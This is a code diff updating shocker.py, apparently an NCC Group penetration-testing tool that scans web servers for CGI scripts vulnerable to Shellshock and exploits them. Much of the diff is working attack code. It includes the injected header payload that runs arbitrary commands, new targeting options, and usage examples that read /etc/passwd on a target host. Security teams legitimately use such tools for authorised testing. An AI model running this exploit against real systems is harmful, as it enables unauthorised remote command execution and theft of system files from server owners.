@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 """
-shocker.py v0.4
+shocker.py v0.5
 A tool to find and exploit webservers vulnerable to Shellshock
 
 ##############################################################################
@@ -14,6 +14,21 @@ A tool to find and exploit webservers vulnerable to Shellshock
 # Released under the GNU Affero General Public License                       #
 # (http://www.gnu.org/licenses/agpl-3.0.html)                                #
 ##############################################################################
+
+Usage examples:
+./shocker.py 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
+Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat 
+/etc/passwd
+
+./shocker.py www.example.com -p 8001 -s
+Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
+attempts the default exploit for any found
+
+Changes in version 0.5
+* Added ability to specify a single script to target rather than using cgi_list
+* Introduced a timeout on socket operations for host_check
+* Added some usage examples in the script header
+* Added an epilogue to the help text indicating presence of examples
 
 Changes in version 0.4
 * Introduced a thread count limit defaulting to 10
@@ -33,10 +48,12 @@ Save results to a file? Format?
     only one is checked.
 Implement some form of progress indicator for slow tasks
 Fix problem with proxy returning 200 for unavailable URLs/false positives
-Pass a URL on the command line to replace cgi_list (or in addition to?)
 Add Windows and *nix colour support
 Prettify
 Other stuff. Probably.
+
+Thanks to...
+Anthony Caulfield @ NCC for time and effort reviewing early versions
 """
 
 import urllib2
@@ -479,6 +496,7 @@ def check_host(host, port, verbose):
         if verbose: print "[I] Resolved ok"
         if verbose: print "[I] Checking to see if %s is reachable..." % host
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5.0)
         s.connect((ipaddr, int(port)))
         s.close()
         if verbose: print "[I] %s seems reachable..." % host
@@ -548,7 +566,7 @@ def check_cgi(req, q):
     finally:
         thread_pool.release()
 
-def exploit(host, proxy, target_list, command, verbose):
+def exploit_cgi(host, proxy, target_list, exploit, verbose):
     # Flag used to identify whether the exploit has successfully caused the
     # server to return a useful response
     success_flag = ''.join(
@@ -557,7 +575,7 @@ def exploit(host, proxy, target_list, command, verbose):
     
     # Dictionary of header:attack string to try against discovered CGI scripts
     attack_strings = {
-       "Content-typo": "() { :;}; echo; echo %s; %s" % (success_flag, command)
+       "Content-typo": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
        }
 
     print "[+] %i potential targets found" % len(target_list)
@@ -587,7 +605,8 @@ def exploit(host, proxy, target_list, command, verbose):
                     buf = StringIO.StringIO(result)
                     for line in buf:
                         if line.strip() != success_flag: 
-                            print "\n%s" % line.strip()
+                            print "%s" % line.strip()
+                    print "\n"
                     buf.close()
                 else:
                     print "[-] Not vulnerable" 
@@ -603,20 +622,24 @@ def main():
   (   )|            |            
    `-. |--. .-.  .-.|.-. .-. .--.
   (   )|  |(   )(   |-.'(.-' |   
-   `-' '  `-`-'  `-''  `-`--''  v0.4 
+   `-' '  `-`-'  `-''  `-`--''  v0.5 
    
- Developed by Tom Watson, tom.watson@nccgroup.com
- http://www.github.com/nccgroup/??????????????#
+ Tom Watson, tom.watson@nccgroup.com
+ http://www.github.com/nccgroup/??????????????
      
  Released under the GNU Affero General Public License
  (http://www.gnu.org/licenses/agpl-3.0.html)
-      """ 
+    """ 
     # Handle CTRL-c elegently
     signal.signal(signal.SIGINT, signal_handler)
 
     # Handle command line argumemts
     parser = argparse.ArgumentParser(
-        description='A Shellshock scanner and exploitation tool'
+        description='A Shellshock scanner and exploitation tool',
+        epilog='Examples of use can be found in the source code' 
+        './shocker.py 127.0.0.1 -e "cat /etc/passwd" -c "/cgi-bin/test.cgi"\n' +
+        'Scan /cgi-bin/test.cgi on localhost and attempt to car /etc/passwd' +
+        'if it is present'
         )
     parser.add_argument(
         'host', 
@@ -630,10 +653,16 @@ def main():
         help='The target port number (default=80)'
         )
     parser.add_argument(
-        '--command',
-        '-c',
+        '--exploit',
+        '-e',
         default="/bin/uname -a",
         help="Command to execute (default=/bin/uname -a)"
+        )
+    parser.add_argument(
+        '--cgi',
+        '-c',
+        type=str,
+        help="Single CGI to check (e.g. /cgi-bin/test.cgi)"
         )
     parser.add_argument(
         '--proxy', 
@@ -670,7 +699,7 @@ def main():
     else:
         proxy = ""
     verbose = args.verbose
-    command = args.command
+    exploit = args.exploit
     if args.ssl == True or port == "443":
         protocol = "https"
     else:
@@ -681,6 +710,9 @@ def main():
         exit(0) 
     else:
         thread_pool = threading.BoundedSemaphore(args.threads)
+    if args.cgi is not None:
+        global cgi_list
+        cgi_list = [args.cgi]
 
     # Check to see host resolves and is reachable on the chosen port
     check_host(host, port, verbose)
@@ -690,7 +722,7 @@ def main():
 
     # If any cgi scripts were found on the target host try to exploit them
     if len(target_list) > 0:
-        exploit(host, proxy, target_list, command, verbose)
+        exploit_cgi(host, proxy, target_list, exploit, verbose)
     else:
         print "[+] No potential targets found - Exiting..."
         exit(0)
